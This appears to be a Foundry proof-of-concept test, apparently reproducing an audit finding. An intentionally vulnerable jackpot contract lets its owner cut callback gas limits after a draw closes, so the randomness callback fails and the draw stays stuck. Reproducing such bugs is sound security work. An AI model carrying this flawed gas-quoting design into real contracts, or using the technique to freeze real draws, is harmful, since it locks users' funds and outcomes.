// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockEntropyProvider {
    function fulfill(address target, bytes32 requestId, bytes32 randomValue, uint256 gasLimit) external returns (bool ok) {
        bytes memory data = abi.encodeWithSignature(
            "scaledEntropyCallback(bytes32,bytes32)",
            requestId,
            randomValue
        );

        (ok,) = target.call{gas: gasLimit}(data);
    }
}

contract VulnerableJackpot {
    address public owner;
    address public entropyProvider;

    uint256 public entropyBaseGasLimit;
    uint256 public entropyVariableGasLimit;

    uint256 public nextDrawId;
    uint256 public nextRequestNonce;

    struct Draw {
        bool closed;
        bool settled;
        uint256 bonusBalls;
        bytes32 requestId;
    }

    mapping(uint256 => Draw) public draws;
    mapping(bytes32 => uint256) public requestToDraw;

    event DrawClosed(uint256 indexed drawId, bytes32 indexed requestId, uint256 quotedCallbackGas);
    event DrawSettled(uint256 indexed drawId);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    modifier onlyEntropyProvider() {
        require(msg.sender == entropyProvider, "not entropy");
        _;
    }

    constructor(address _entropyProvider, uint256 _base, uint256 _variable) {
        owner = msg.sender;
        entropyProvider = _entropyProvider;
        entropyBaseGasLimit = _base;
        entropyVariableGasLimit = _variable;
    }

    function setEntropyBaseGasLimit(uint256 newLimit) external onlyOwner {
        entropyBaseGasLimit = newLimit;
    }

    function setEntropyVariableGasLimit(uint256 newLimit) external onlyOwner {
        entropyVariableGasLimit = newLimit;
    }

    function createAndCloseDraw(uint256 bonusBalls) external onlyOwner returns (uint256 drawId, bytes32 requestId, uint256 quotedGas) {
        drawId = ++nextDrawId;

        Draw storage d = draws[drawId];
        d.closed = true;
        d.bonusBalls = bonusBalls;

        requestId = keccak256(abi.encodePacked(address(this), drawId, ++nextRequestNonce));
        d.requestId = requestId;
        requestToDraw[requestId] = drawId;

        quotedGas = getEntropyCallbackFee(drawId);
        emit DrawClosed(drawId, requestId, quotedGas);
    }

    function getEntropyCallbackFee(uint256 drawId) public view returns (uint256) {
        Draw storage d = draws[drawId];
        return entropyBaseGasLimit + entropyVariableGasLimit * d.bonusBalls;
    }

    function scaledEntropyCallback(bytes32 requestId, bytes32 randomValue) external onlyEntropyProvider {
        uint256 drawId = requestToDraw[requestId];
        require(drawId != 0, "unknown request");

        Draw storage d = draws[drawId];
        require(d.closed, "not closed");
        require(!d.settled, "already settled");

        uint256 requiredWork = d.bonusBalls;

        for (uint256 i = 0; i < requiredWork; i++) {
            bytes32 h = randomValue;
            for (uint256 j = 0; j < 400; j++) {
                h = keccak256(abi.encodePacked(h, i, j, block.number));
            }
            if (uint256(h) == type(uint256).max) {
                revert("impossible");
            }
        }

        d.settled = true;
        emit DrawSettled(drawId);
    }

    function isSettled(uint256 drawId) external view returns (bool) {
        return draws[drawId].settled;
    }
}

contract ExploitTest is Test {
    VulnerableJackpot jackpot;
    MockEntropyProvider entropy;

    address owner = address(0xA11CE);

    function setUp() public {
        entropy = new MockEntropyProvider();

        vm.prank(owner);
        jackpot = new VulnerableJackpot(address(entropy), 2_000_000, 300_000);

        vm.deal(owner, 10 ether);
    }

    function test_exploit() public {
        vm.prank(owner);
        (uint256 drawId, bytes32 requestId, uint256 quotedGasBefore) = jackpot.createAndCloseDraw(8);

        assertEq(quotedGasBefore, 2_000_000 + 300_000 * 8);

        vm.prank(owner);
        jackpot.setEntropyBaseGasLimit(25_000);

        vm.prank(owner);
        jackpot.setEntropyVariableGasLimit(5_000);

        uint256 quotedGasAfter = jackpot.getEntropyCallbackFee(drawId);
        assertEq(quotedGasAfter, 25_000 + 5_000 * 8);
        assertLt(quotedGasAfter, quotedGasBefore);

        bool ok = entropy.fulfill(address(jackpot), requestId, keccak256("rand"), quotedGasAfter);

        assertFalse(ok, "callback should fail due to underfunded gas after admin reconfiguration");
        assertFalse(jackpot.isSettled(drawId), "draw remains unresolved/stuck");

        bool okWithOriginalGas = entropy.fulfill(address(jackpot), requestId, keccak256("rand2"), quotedGasBefore);

        assertTrue(okWithOriginalGas, "same in-flight request succeeds when fulfilled with original gas budget");
        assertTrue(jackpot.isSettled(drawId), "draw settles only when enough gas is provided");
    }
}